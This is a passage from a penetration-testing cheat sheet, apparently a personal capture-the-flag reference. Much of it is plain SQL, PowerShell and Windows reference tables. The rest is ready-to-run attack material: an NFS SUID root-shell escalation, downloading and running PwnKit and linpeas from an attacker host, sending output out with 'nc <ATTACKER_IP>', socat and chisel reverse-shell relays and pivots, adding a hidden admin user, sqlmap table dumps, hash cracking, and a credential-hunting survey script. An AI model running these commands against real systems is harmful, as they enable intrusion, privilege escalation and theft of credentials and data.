    setuid(0); setgid(0);
    system("/bin/bash -p");
}' > /tmp/nfs_mount/shell.c

# 3. Compile the file
sudo gcc /tmp/nfs_mount/shell.c -o /tmp/nfs_mount/shell

# 4. Set SUID bit on compiled binary
sudo chmod +s /tmp/nfs_mount/shell

# 5. Unmount the share
sudo umount /tmp/nfs_mount

# Exploitation (on Target Machine):
# Log in as normal user and execute SUID binary from share
<SHARE_PATH>/shell
```

### 🔍 Linpeas Enumerator

* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
* https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/
* https://gtfobins.github.io/

```bash
# KALI
cd /tmp
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
ip a ; python3 -m http.server 8000

# TARGET
cd /tmp
wget http://<IP_ADDR>:8000/linpeas.sh
chmod +x linpeas.sh
REGEXES="0" ./linpeas.sh 2>&1 | tee linpeas_output.txt
```

```bash
# SCP
scp -P <PORT> <USER>@<IP_ADDR>:/tmp/linpeas_output.txt ~/

# NC
nc -l -p <PORT> > ~/linpeas_output.txt
cat /tmp/linpeas_output.txt | nc <ATTACKER_IP> <PORT>
```

### 🚨 CVE-2021-4034 - Pkexec Local Privilege Escalation (privesc)
```bash
# LOCAL: Download and execute the PwnKit privesc
cd /tmp
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
ip a ; python3 -m http.server 8000

# REMOTE: Download and run privesc
curl -o PwnKit http://<KALI_IP>:8000/PwnKit
chmod +x PwnKit
./PwnKit
```

## 🔐 sshpass

```bash
# SSH into a target using a password with sshpass (non-interactive)
sshpass -p '<PASSWORD>' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 <USER>@<TARGET>
```

## 🔓 Password Cracking

### 🔨 Cracking Hashes with John and Hashcat
```bash
# Convert an SSH private key to a hash format for John the Ripper
ssh2john /path/to/id_rsa > /path/to/hash.txt

# Crack a hash file using a wordlist with John the Ripper
# John will attempt to guess the hash type, but specifiying the FORMAT is recommended
john --list=formats
# john --format=NT
# john --format=raw-md5
# john --format=sha512crypt
john --format=<FORMAT> --wordlist=/usr/share/wordlists/rockyou.txt --output=john_cracked_hashes.txt /path/to/hash.txt
# Single crack mode: makes permutations given a username
# bobby:1234567890ABCDEF
john --single --format=<FORMAT> --output=john_cracked_single.txt /path/to/hash.txt
# Zipfiles
zip2john <ZIP_FILE> > hash_zip.txt
# RARfiles
rar2john <ZIP_FILE> > hash_rar.txt
# SSH id_rsa
ssh2john <ID_RSA> > hash_id_rsa.txt
```

- https://hashcat.net/wiki/doku.php?id=example_hashes

```bash
# Crack an MD5crypt hash with a salt using Hashcat
hashcat -O -a 0 -m 20 <HASH>:<SALT> /usr/share/wordlists/rockyou.txt --outfile=hashcat_cracked_hashes.txt

# Crack a SHA512crypt hash using Hashcat
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt --outfile=hashcat_cracked_hashes.txt
```

## 🍃 Databases

### 🗄️ SQL

| Command                                   | Description                                                     | Example                                                         |
| :---------------------------------------- | :-------------------------------------------------------------- | :-------------------------------------------------------------- |
| **DATABASE & TABLE MGMT**                 |                                                                 |                                                                 |
| `CREATE DATABASE db_name;`                | Creates a new database.                                         | `CREATE DATABASE thm_bookmarket_db;`                            |
| `SHOW DATABASES;`                         | Lists all available databases.                                  | `SHOW DATABASES;`                                               |
| `USE db_name;`                            | Switches the active context to a specific database.             | `USE thm_bookmarket_db;`                                        |
| `DROP DATABASE db_name;`                  | Deletes an entire database.                                     | `DROP DATABASE old_db;`                                         |
| `CREATE TABLE table_name (...);`          | Creates a new table with specified columns and data types.      | `CREATE TABLE books (id INT, name VARCHAR(255));`               |
| `SHOW TABLES;`                            | Lists all tables in the currently active database.              | `SHOW TABLES;`                                                  |
| `DESCRIBE table_name;`                    | Shows the structure of a table (columns, data types, etc.).     | `DESCRIBE book_inventory;`                                      |
| `ALTER TABLE table_name ADD ...;`         | Modifies an existing table, such as adding a new column.        | `ALTER TABLE books ADD page_count INT;`                         |
| `DROP TABLE table_name;`                  | Deletes an entire table.                                        | `DROP TABLE old_books;`                                         |
| **CRUD OPERATIONS**                       |                                                                 |                                                                 |
| `INSERT INTO table (...) VALUES (...);`   | Adds a new record (row) into a table.                           | `INSERT INTO books (id, name) VALUES (1, 'New Book');`          |
| `SELECT columns FROM table;`              | Retrieves data (reads records) from a table.                    | `SELECT name, description FROM books;`                          |
| `SELECT * FROM table;`                    | Retrieves all columns for all records in a table.               | `SELECT * FROM books;`                                          |
| `UPDATE table SET col=val WHERE ...;`     | Modifies existing records in a table.                           | `UPDATE books SET name = 'Updated Name' WHERE id = 1;`          |
| `DELETE FROM table WHERE ...;`            | Removes records from a table.                                   | `DELETE FROM books WHERE id = 1;`                               |
| **CLAUSES**                               |                                                                 |                                                                 |
| `SELECT DISTINCT column ...;`             | Returns only unique values from a column, removing duplicates.  | `SELECT DISTINCT category FROM books;`                          |
| `... GROUP BY column;`                    | Groups rows that have the same values into summary rows.        | `SELECT category, COUNT(*) FROM books GROUP BY category;`       |
| `... ORDER BY column ASC;`                | Sorts the result set in ascending order.                        | `SELECT * FROM books ORDER BY name ASC;`                        |
| `... ORDER BY column DESC;`               | Sorts the result set in descending order.                       | `SELECT * FROM books ORDER BY published_date DESC;`             |
| `... HAVING condition;`                   | Filters results after aggregation (used with `GROUP BY`).       | `... GROUP BY category HAVING COUNT(*) > 5;`                    |
| **OPERATORS**                             |                                                                 |                                                                 |
| `... WHERE column LIKE 'pattern';`        | Searches for a specified pattern in a column (`%` is wildcard). | `WHERE description LIKE '%guide%';`                             |
| `... WHERE condition1 AND condition2;`    | Returns records only if both conditions are true.               | `WHERE category = 'Hacking' AND published_date > '2020-01-01';` |
| `... WHERE condition1 OR condition2;`     | Returns records if at least one of the conditions is true.      | `WHERE name = 'BookA' OR name = 'BookB';`                       |
| `... WHERE NOT condition;`                | Excludes records that meet a specific condition.                | `WHERE NOT category = 'Hacking';`                               |
| `... WHERE column BETWEEN val1 AND val2;` | Selects values within a given range (inclusive).                | `WHERE id BETWEEN 10 AND 20;`                                   |
| `... WHERE column = value;`               | Equal to.                                                       | `WHERE id = 5;`                                                 |
| `... WHERE column != value;`              | Not equal to.                                                   | `WHERE category != 'Hacking';`                                  |
| `... WHERE column > value;`               | Greater than.                                                   | `WHERE published_date > '2020-01-01';`                          |
| `... WHERE column < value;`               | Less than.                                                      | `WHERE price < 50;`                                             |
| `... WHERE column >= value;`              | Greater than or equal to.                                       | `WHERE price >= 100;`                                           |
| `... WHERE column <= value;`              | Less than or equal to.                                          | `WHERE price <= 25;`                                            |
| **FUNCTIONS**                             |                                                                 |                                                                 |
| `CONCAT(str1, str2, ...);`                | Combines two or more strings into one.                          | `SELECT CONCAT(name, ' - ', category) FROM books;`              |
| `GROUP_CONCAT(column);`                   | Concatenates data from multiple rows into one string.           | `SELECT GROUP_CONCAT(name) FROM books;`                         |
| `SUBSTRING(string, start, length);`       | Extracts a substring from a string.                             | `SELECT SUBSTRING(published_date, 1, 4) FROM books;`            |
| `LENGTH(string);`                         | Returns the length of a string in characters.                   | `SELECT name, LENGTH(name) FROM books;`                         |
| `COUNT(column);`                          | Returns the number of rows.                                     | `SELECT COUNT(*) FROM books;`                                   |
| `SUM(column);`                            | Returns the total sum of a numeric column.                      | `SELECT SUM(price) FROM books;`                                 |
| `MAX(column);`                            | Returns the largest value in a column.                          | `SELECT MAX(price) FROM books;`                                 |
| `MIN(column);`                            | Returns the smallest value in a column.                         | `SELECT MIN(price) FROM books;`                                 |

### 🐬 MySQL / MariaDB

```bash
# Enhanced nmap scan for MySQL service
nmap -Pn -sV -p 3306 -A -oA $(date +%Y-%m-%d_%H%M)_mysql_enum <TARGET>  # Better service enumeration

# Connect to MySQL/MariaDB with mycli (enhanced MySQL client)
mycli -u root -h <TARGET>

# MariaDB-specific commands:
SHOW databases;
USE <DATABASE>;
SHOW tables;
SELECT * FROM <TABLE>;
```

### 🔍 sqlmap

| Command                               | Description                                                                                                                                                                                   |
| :------------------------------------ | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `sqlmap --wizard`                     | Starts an interactive, step-by-step wizard that guides you through setting up a scan. Ideal for beginners.                                                                                    |
| `sqlmap -r post_request.txt`          | Reads a raw HTTP request from a file (e.g., saved from Burp Suite) and automatically parses it to test for vulnerabilities. Essential for testing POST requests and complex web applications. |
| `sqlmap --batch -u '<URL>'`           | Runs a non-interactive scan on a target URL, accepting default answers for all questions. This is the starting point for most scans.                                                          |
| `... --dbs`                           | Enumerates (lists) all the databases that the current user can access on the server.                                                                                                          |
| `... -D <DATABASE> --tables`          | After identifying a database, this command lists all the tables within that specific database.                                                                                                |
| `... -D <DATABASE> -T <TABLE> --dump` | Dumps (extracts) all the data from a specific table within a specific database. This is the final step to retrieve the data.                                                                  |

#### Authenticated Web Scans (with Cookie)

```bash
# Run sqlmap with session cookie for authenticated pages
sqlmap -u "http://<TARGET_IP>/view_profile.php?id=1" --cookie="<COOKIE_HEADER>=<COOKIE_VALUE>" --dbs
```

### 💾 MongoDB

```bash
# Connect to a MongoDB instance on a specific port
mongo --port 27117

# List all available databases
show dbs

# Switch to a specific database
use <DB_NAME>

# List all collections (tables) in the current database
show collections

# Find and display all documents (rows) in a collection
db.<COLLECTION>.find().pretty()

# Generate a SHA512crypt password hash to change password
openssl passwd -6 <PASSWORD>
db.admin.update({ "name" : "administrator" }, { $set: { "x_shadow" : "<HASH>" } });
```

## 🖥️ RDP via xfreerdp

```bash
xfreerdp3 /clipboard /dynamic-resolution /cert:ignore /v:<TARGET> /u:<USER> /p:'<PASSWORD>'
```

## 🐧 Linux Commands

### 🐍 `strings` in Python

```bash
python3 -c "import re, sys; [print(m.decode()) for m in re.findall(b'[ -~]{4,}', open(sys.argv[1], 'rb').read())]" <FILE>
```

### 🔤 `strings` w/ different Encodings

```bash
FILE="FILENAME" ; ( strings -S "$FILE" ; strings -l "$FILE" ; strings -b "$FILE" ) | sort -u
```

### Longest String from text file

```bash
awk '{ print length, $0 }' <FILENAME> | sort -nr | uniq | head -n 20 | cut -d" " -f2-
```

## 🪟 Windows Commands

```powershell
# Survey
set
ver
systeminfo
driverquery

ipconfig /all
nbtstat -n
netstat -anob

dir /a
tree
type
more
tasklist

ping
tracert
nslookup

# Add User w/ admin privs
net user <USERNAME> <PASSWORD> /add
net localgroup administrators <USERNAME> /add
net localgroup "Remote Management Users" <USERNAME> /add
```

### 💻 PowerShell

```powershell
###

Get-Content
Set-Location
Get-Command
Get-Command -CommandType "Function"
Get-Help
Get-Alias
Find-Module
Install-Module
Get-ChildItem
Remove-Item
Copy-Item
Move-Item

# Piping
Get-ChildItem | Sort-Object Length
Where-Object
Get-ChildItem | Where-Object -Property "Extension" -eq ".txt"
Get-ChildItem | Where-Object -Property "Name" -like "ship*"  
Get-ChildItem | Select-Object Name,Length 
Get-ChildItem | Sort-Object Length -Descending | Select-Object -First 1
Select-String -Path ".\captain-hat.txt" -Pattern "hat"

# Zesty details
Get-ComputerInfo
Get-LocalUser
Get-NetIPConfiguration
Get-Process
Get-Service
Get-NetTCPConnection
Get-FileHash
Invoke-Command
Invoke-Command -ComputerName Server01 -Credential Domain01\User01 -ScriptBlock { Get-Culture }

# Active Directory
# Quick-open DC Admin Console
WIN + R
dsa.msc

# Group Policy Management Console 
WIN + R
gpmc.msc

# Update and apply GPOs to computers
# syncs via the share SYSVOL at C:\Windows\SYSVOL\sysvol\
gpupdate /force

# Change password
Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose

# Force new password for user on login
Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose
```

### Windows Survey for PrivEsc (MSDOS)

```bash
search flag dir /b/s *flag.txt  
whoami /priv          
query user                 # use it to see if anyother user is currently logged in 
net users     # list all the users
net user administrator     # Detailed info about the user 
net localgroup        # to list all the groups 
net localgroup administrators
ipconfig /all
arp -a    # to see other connected devices
netstat -ano  # print open ports used by services running on the system
```
### Windows Survey for PrivEsc (PowerShell)

```powershell
# ===============================================================
# ===       WINDOWS PRIVILEGE ESCALATION SURVEY SCRIPT        ===
# ===============================================================
#
#  Purpose: Quickly identify Tier 1 & Tier 2 privilege escalation
#           vectors using built-in Windows commands.
#  Usage:
#    1. Transfer this script to the target machine.
#    2. Open a PowerShell prompt.
#    3. Run: Set-ExecutionPolicy Bypass -Scope Process -Force
#    4. Run: . .\windows_survey.ps1
#
#################################################################

# --- Start logging all output to a file ---
$outputFile = "C:\Windows\Temp\windows_survey_output.txt"
Start-Transcript -Path $outputFile

# --- Main Survey Execution ---

Write-Host "===============================================================" -ForegroundColor Cyan
Write-Host "===        WINDOWS PRIVILEGE ESCALATION SURVEY SCRIPT       ===" -ForegroundColor Cyan
Write-Host "===============================================================" -ForegroundColor Cyan

Write-Host "`n===== WHO AM I? & SYSTEM INFO =====" -ForegroundColor Green
Write-Host "--- Current User & Groups ---"
whoami /all
Write-Host "`n--- System Information ---"
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

Write-Host "`n===== [CRITICAL] WINDOWS PRIVILEGES (whoami /priv) =====" -ForegroundColor Yellow
Write-Host "Look for SeImpersonate, SeAssignPrimaryToken, SeBackup, SeTakeOwnership, SeLoadDriver"
whoami /priv

Write-Host "`n===== [TIER 1] CREDENTIALS & SENSITIVE FILES =====" -ForegroundColor Green
Write-Host "--- Common Unattend/Sysprep Files ---"
$unattendFiles = @("C:\Unattend.xml", "C:\Windows\Panther\Unattend.xml", "C:\Windows\system32\sysprep.inf", "C:\Windows\system32\sysprep\sysprep.xml")
foreach ($file in $unattendFiles) {
    if (Test-Path $file) { Get-Content $file }
}

Write-Host "`n--- PowerShell History File ---"
try {
    Get-Content (Get-PSReadlineOption).HistorySavePath
} catch {
    Write-Host "PSReadline history not found."
}

Write-Host "`n--- Saved Credentials (cmdkey) ---"
cmdkey /list

Write-Host "`n--- Common Application Config Files (web.config) ---"
Get-ChildItem -Path C:\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object { Get-Content $_.FullName | findstr "connectionString" }

Write-Host "`n--- Common Registry Password Locations ---"
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "ProxyPassword" /s 2>$null
reg query HKEY_CURRENT_USER\Software\ORL\WinVNC3\Password /s 2>$null

Write-Host "`n===== [TIER 1] SERVICE MISCONFIGURATIONS =====" -ForegroundColor Green
Write-Host "--- Unquoted Service Paths (potential for hijacking) ---"
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /v "`""

Write-Host "`n--- Services with Writable Binaries/Folders ---"
Write-Host "Manually check permissions on these paths with 'icacls'"
# Get all services NOT running from C:\Windows, then check permissions on their binaries
$services = Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -notlike "C:\Windows*" -and $_.PathName }
foreach ($service in $services) {
    $path = $service.PathName.Trim('"')
    if (Test-Path $path) {
        Write-Host "`nService: $($service.Name)"
        Write-Host "Binary Path: $path"
        icacls $path
    }
}

Write-Host "`n===== [TIER 2] SCHEDULED TASK MISCONFIGURATIONS =====" -ForegroundColor Green
Write-Host "Checking for tasks running with high privileges and checking permissions on the executables..."
$tasks = schtasks /query /fo list /v
$taskPath = ""
foreach ($line in ($tasks -split "`n")) {
    if ($line -match "Run As User:\s+(NT AUTHORITY\\SYSTEM|Administrators)") {
        Write-Host "`n[+] High-Privilege Task Found:" -ForegroundColor Yellow
        Write-Host $line.Trim()
    }
    if ($line -match "Task To Run:\s+(.*)") {
        $taskPath = $matches[1].Trim()
        if ($taskPath -ne "N/A" -and (Test-Path $taskPath)) {
            Write-Host "--- Permissions for Task Binary: $taskPath ---"
            icacls $taskPath
        }
    }
}

Write-Host "`n===== [TIER 1] REGISTRY QUICK WINS =====" -ForegroundColor Green
Write-Host "--- AlwaysInstallElevated ---"
$key1 = reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null
$key2 = reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null
if ($key1 -and $key2) {
    Write-Host "[!!!] VULNERABLE: AlwaysInstallElevated is set in both HKLM and HKCU!" -ForegroundColor Red
    $key1
    $key2
} else {
    Write-Host "[-] AlwaysInstallElevated not configured."
}

Write-Host "`n===== SURVEY COMPLETE =====" -ForegroundColor Cyan
Write-Host "Results saved to: $outputFile" -ForegroundColor Cyan

# --- Stop logging ---
Stop-Transcript
```

## 🌱 Living Off the Land

Ref: https://lolbas-project.github.io/#

### Pivoting and Tunneling OtL

- Linux: `/etc/hosts`
    - DNS: `/etc/resolv.conf`
- Windows: `C:\Windows\System32\drivers\etc\hosts`

- Proxychains and FoxyProxy are used to access a proxy created with one of the other tools
- SSH can be used to create both port forwards, and proxies
- plink.exe is an SSH client for Windows, allowing you to create reverse SSH connections on Windows
- Socat is a good option for redirecting connections, and can be used to create port forwards in a variety of different ways
- Chisel can do the exact same thing as with SSH portforwarding/tunneling, but doesn't require SSH access on the box
- sshuttle is a nicer way to create a proxy when we have SSH access on a target

#### Routing Table Manipulation

```bash
### Enable routing if not already (requires elevation)
# On a Linux Pivot Host:
sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
# On a Windows Pivot Host:
Set-NetIPInterface -Forwarding Enabled

### Add route through compromised host to access internal network
sudo ip route add <SUBNETWORK>/24 via <COMPROMISED_GATEWAY>
```

```bash
#####################################################################
#                   NETWORK PIVOTING CHEATSHEET                     #
#####################################################################

#====================================================================
# 1. INITIAL ENUMERATION (from the Compromised Host)
#====================================================================
# Description: Commands to run on the first compromised machine to
# understand the internal network without uploading tools.

| Command | Purpose |
| :--- | :--- |
| `arp -a` | (Linux/Windows) Check the ARP cache for recently contacted IPs. |
| `cat /etc/hosts` | (Linux) Check for static DNS entries. |
| `cat /etc/resolv.conf` | (Linux) Find internal DNS servers. |
| `ipconfig /all` | (Windows) Find DNS servers and network interface details. |
| `nmcli dev show` | (Linux) Alternative to see DNS and interface details. |

# --- Bash Network Sweeps (Living off the Land) ---

# A) Ping Sweep (Find live hosts)
# Pings all hosts from .1 to .254 on a given subnet in parallel.
for i in {1..254}; do (ping -c 1 <SUBNET>.${i} | grep "bytes from" &); done

# B) Port Scan a Single Host (Very Slow)
# Scans all ports on a target IP. Best to use a smaller range (e.g., {1..1000}).
for i in {1..65535}; do (echo > /dev/tcp/<TARGET_IP>/$i) >/dev/null 2>&1 && echo "[+] Port $i is open"; done

#====================================================================
# 2. SSH TUNNELLING (Requires SSH access to the pivot machine)
#====================================================================
# Description: Uses a standard SSH client to forward ports or create a proxy.
# The '-fN' flags are used to background the connection and not execute a command.

| Type | Command | Description |
| :--- | :--- | :--- |
| **Local Port Forward (`-L`)** | `ssh -L <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> user@<PIVOT_HOST> -fN` | Connects **from your attacker machine** to the pivot. Access `localhost:<LOCAL_PORT>` to reach the target. |
| **Dynamic Proxy (`-D`)** | `ssh -D <LOCAL_PORT> user@<PIVOT_HOST> -fN` | Connects **from your attacker machine**. Creates a SOCKS proxy on `localhost:<LOCAL_PORT>` to pivot all traffic through. Use with `proxychains`. |
| **Remote Port Forward (`-R`)** | `ssh -R <ATTACKER_PORT>:<TARGET_IP>:<TARGET_PORT> user@<ATTACKER_IP> -i keyfile -fN` | Connects **from the compromised pivot machine** back to your attacker machine. Useful when you have a shell but no direct SSH access *to* the pivot. |

# --- Setup for SSH Remote Port Forwarding (Reverse Connection) ---

# 1. (Attacker) Generate throwaway SSH keys:
ssh-keygen

# 2. (Attacker) Add public key to authorized_keys and restrict it to prevent a shell on your machine:
# Add this full line into ~/.ssh/authorized_keys
command="echo 'This key is for port forwarding only'",no-agent-forwarding,no-x11-forwarding,no-pty <CONTENTS_OF_PUBLIC_KEY.pub>

# 3. (Attacker) Ensure your SSH server is running:
sudo systemctl start ssh

# 4. (Target) Transfer the PRIVATE key to the compromised machine to initiate the connection.

#====================================================================
# 3. SOCAT (Versatile Relaying & Port Forwarding)
#====================================================================
# Description: A powerful tool for connecting two points. Requires uploading a
# static binary to the target machine.

| Type | Command (On Pivot Machine) | Description |
| :--- | :--- | :--- |
| **Reverse Shell Relay** | `./socat tcp-l:<RELAY_PORT> tcp:<ATTACKER_IP>:<ATTACKER_PORT> &` | Catches a reverse shell from an isolated machine and forwards it to your attacker machine. You need a listener on `<ATTACKER_PORT>`. |
| **Simple Port Forward** | `./socat tcp-l:<FORWARD_PORT>,fork,reuseaddr tcp:<TARGET_IP>:<TARGET_PORT> &` | Opens a port on the pivot machine. Any traffic sent to it gets forwarded to the internal target. |

# --- "Quiet" Socat Port Forward (No open port on pivot) ---

# 1. On ATTACKER machine:
# Creates a local relay between two ports.
socat tcp-l:<LOCAL_PORT_1> tcp-l:<LOCAL_PORT_2>,fork,reuseaddr &

# 2. On PIVOT machine:
# Connects the attacker's relay to the internal target.
./socat tcp:<ATTACKER_IP>:<LOCAL_PORT_2> tcp:<TARGET_IP>:<TARGET_PORT>,fork &

# Result: Accessing localhost:<LOCAL_PORT_1> on your attacker machine now connects to the target.

#====================================================================
# 4. CHISEL (Modern Proxy & Port Forwarding over HTTP)
#====================================================================
# Description: A client/server tool written in Go. Excellent for creating fast
# reverse SOCKS proxies. Requires chisel binary on both attacker and target.

# --- Reverse SOCKS Proxy (Most Common Use) ---

# 1. On ATTACKER machine (as server):
# Starts a listener for the compromised host to connect back to.
./chisel server -p <LISTEN_PORT> --reverse &

# 2. On PIVOT machine (as client):
# Connects back to your server and establishes the proxy.
./chisel client <ATTACKER_IP>:<LISTEN_PORT> R:socks &

# NOTE: The SOCKS5 proxy will be created on your attacker machine, typically on 127.0.0.1:1080. Check Chisel's output.

# --- Remote Port Forward ---

# 1. On ATTACKER machine (as server):
./chisel server -p <LISTEN_PORT> --reverse &

# 2. On PIVOT machine (as client):
./chisel client <ATTACKER_IP>:<LISTEN_PORT> R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> &

# Result: Your attacker machine can now access the target service via localhost:<LOCAL_PORT>.

#====================================================================
# 5. SSHUTTLE (Simulates a VPN via SSH)
#====================================================================
# Description: Forwards traffic for an entire subnet over an SSH connection.
# Requires SSH access and Python on the pivot host. Run only on your attacker machine.

| Type | Command (On Attacker Machine) |
| :--- | :--- |
| **Password Auth** | `sshuttle -r user@<PIVOT_HOST> <TARGET_SUBNET>` |
| **Key-Based Auth** | `sshuttle -r user@<PIVOT_HOST> --ssh-cmd "ssh -i <KEYFILE>" <TARGET_SUBNET>` |

# Error Mitigation:
# If you get a "Broken pipe" error, it's likely because the pivot host is inside the subnet you're forwarding.
# Exclude the pivot host's IP to fix it:
sshuttle ... -x <PIVOT_HOST_IP>

#====================================================================
# 6. USING THE PIVOT
#====================================================================

# --- ProxyChains ---
# Description: Tool to force CLI applications to use a SOCKS proxy.

# 1. Configure the proxy server at the bottom of /etc/proxychains4.conf:
# [ProxyList]
# socks5  127.0.0.1 1080  # For Chisel
# socks4  127.0.0.1 1337  # For an SSH -D proxy

# 2. Prepend 'proxychains' to your command:
proxychains nmap -sT -p 80,443 <INTERNAL_IP>

# --- plink.exe (Windows SSH Tunnelling) ---
# Description: PuTTY's command-line tool for Windows reverse connections.

# 1. (Attacker) Convert OpenSSH key to PuTTY format:
puttygen <KEYFILE> -o <OUTPUT_KEY.ppk>

# 2. (Windows Pivot) Transfer plink.exe and the .ppk key, then execute:
cmd.exe /c echo y \| .\plink.exe -R <ATTACKER_PORT>:<TARGET_IP>:<TARGET_PORT> user@<ATTACKER_IP> -i <KEYFILE.ppk> -N
```

## 📁 Files

## 📍 Good Locations

### 🪟 Windows

| Variable                  | Description                                            | Example Value               |
|---------------------------|--------------------------------------------------------|-----------------------------|
| %windir%                  | Windows installation directory                         | C:\Windows                  |
| %SystemRoot%              | Alias for %windir%                                     | C:\Windows                  |
| %ProgramFiles%            | Default directory for 64-bit programs                  | C:\Program Files            |
| %ProgramFiles(x86)%       | Default directory for 32-bit programs on 64-bit systems| C:\Program Files (x86)      |
| %CommonProgramFiles%      | Default directory for 64-bit common files              | C:\Program Files\Common Files|
| %CommonProgramFiles(x86)% | Default directory for 32-bit common files on 64-bit systems | C:\Program Files (x86)\Common Files |
| %SystemDrive%             | Drive letter of the system partition                   | C:                          |
| %USERPROFILE%             | Path to the current user's profile directory           | C:\Users\username           |
| %APPDATA%                 | User's roaming application data directory              | C:\Users\username\AppData\Roaming |
| %LOCALAPPDATA%            | User's local application data directory                | C:\Users\username\AppData\Local |
| %TEMP% or %TMP%           | User's temporary files directory                       | C:\Users\username\AppData\Local\Temp |
| %HOMEDRIVE%               | Drive letter of the user's home directory              | C:                          |
| %HOMEPATH%                | Path to the user's home directory                      | \Users\username             |
| %PATH%                    | Semicolon-separated list of executable search paths    | C:\Windows;C:\Windows\System32 |
| %PATHEXT%                 | Semicolon-separated list of executable file extensions | .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC |
| %PUBLIC%                  | Path to the public user directory                      | C:\Users\Public             |
| %USERNAME%                | The name of the current user                           | username                    |
| %COMPUTERNAME%            | The name of the computer                               | DESKTOP-XXXXXX              |

### ⚙️ System Settings

| Command | Utility | Description |
|---|---|---|
| appwiz.cpl | Programs and Features | Uninstall or change programs |
| certmgr.msc | Certificate Manager | Manage user and computer certificates |
| compmgmt.msc | Computer Management | A collection of administrative tools |
| control /name Microsoft.WindowsUpdate | Windows Update | Opens the Windows Update settings page |
| control.exe | Control Panel | Opens the main Control Panel window |
| devmgmt.msc | Device Manager | Manage hardware devices and drivers |
| diskmgmt.msc | Disk Management | Manage disk drives and partitions |
| dsa.msc | Active Directory Users & Computers| Manage users, groups, and computers in a domain |
| eventvwr.msc | Event Viewer | View system event logs |
| gpedit.msc | Local Group Policy Editor | Manage local security and user settings |
| gpmc.msc | Group Policy Management Console | Manage Group Policy in an Active Directory forest |
| lusrmgr.msc | Local Users and Groups | Manage local user accounts and groups |
| mmc | Microsoft Management Console | Create custom administrative consoles |
| msconfig | System Configuration | Manage boot options and startup programs |
| msinfo32 | System Information | View detailed system hardware and software info |
| ncpa.cpl | Network Connections | View and manage network adapters |
| perfmon.msc | Performance Monitor | Monitor system performance |
| regedit | Registry Editor | Edit the Windows registry |
| secpol.msc | Local Security Policy | Manage local security settings |
| services.msc | Services | Manage system services |
| taskmgr | Task Manager | Monitor system processes and performance |
| WF.msc | Windows Defender Firewall | Configure advanced firewall settings |

### 📋 Windows Event Logs

| Event ID | Description                                         |
| :------- | :-------------------------------------------------- |
| **4624** | A user account successfully logged in.              |
| **4625** | A user account failed to log in.                    |
| **4634** | A user account successfully logged off.             |
| **4720** | A user account was created.                         |
| **4724** | An attempt was made to reset an account’s password. |
| **4722** | A user account was enabled.                         |
| **4725** | A user account was disabled.                        |
| **4726** | A user account was deleted.                         |

# 📚 Resources

## ⚙️ Prep Commands

```bash
# Add HOST for local DNS resolution in /etc/hosts file
echo '<TARGET> <TARGET_HOST>' | sudo tee -a /etc/hosts
```

## 🎯 EZ Wins & Searching Info
```bash
# Use zbarimg to scan a QR code from an image file
sudo apt-get install -y zbar-tools
zbarimg <QR_CODE>

# Use ltrace to trace library calls of an executable
ltrace <EXE_FILE>

# Stegohide
steghide info <FILE>

# PDFs
pdfinfo <PDF_FILE>

# EXIF data
exiftool -a -G <FILE>

# Search for easy flags
sudo find / -type f \( -name "user.txt" -o -name "root.txt" -o -name "flag.txt" \) 2>/dev/null
```

## 🐍 Run Python2 Scripts

```bash
# --- Step 1: Install Python 2 and its pip package manager ---
echo "[*] Ensuring python2 and pip2 are installed..."
sudo apt-get update
sudo apt-get install -y python2
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
sudo python2 get-pip.py
echo "[+] Pip for Python 2 installed."

# --- Step 2: Upgrade pip and setuptools to prevent dependency errors ---
echo "[*] Upgrading pip and setuptools for Python 2..."
sudo python2 -m pip install --upgrade pip setuptools
echo "[+] Core packages upgraded."

# --- Step 3: Install virtualenv for Python 2 ---
echo "[*] Installing virtualenv for Python 2..."
sudo python2 -m pip install virtualenv
echo "[+] virtualenv installed."

# --- Step 4: Create the virtual environment using the failsafe method ---
echo "[*] Creating the Python 2 virtual environment in './py2-env'..."
python2 -m virtualenv py2-env
echo "[+] Environment 'py2-env' created successfully."

# --- Step 5: Provide instructions on how to activate and use the environment ---
echo -e "\n[!] SETUP COMPLETE. To use the environment, run the following commands:"
echo "    source py2-env/bin/activate"
echo "    pip install <required_packages>"
echo "    python <your_exploit.py>"
echo "    deactivate"
```

## 📝 Wordlists

### 🌐 Web Directory Enumeration (Gobuster, ffuf)
*   **Find Hidden Admin Pages:** `/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt`
    *   High-quality list specifically curated for finding common directory names
*   **Fast Recon:** `/usr/share/seclists/Discovery/Web-Content/common.txt`
*   **Comprehensive:** `/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt`

### 📄 Web File Enumeration (ffuf)
*   **Find Hidden Files (.php, .bak, etc.):** `/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt`
    *   Curated for finding common file names and extensions

### 🔓 Password Attacks
#### Online Brute-Force (Hydra, ffuf)
*   **Web Logins & SSH/FTP:** `/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt`
    *   **Why:** Small, fast, high-probability. Avoids account lockouts
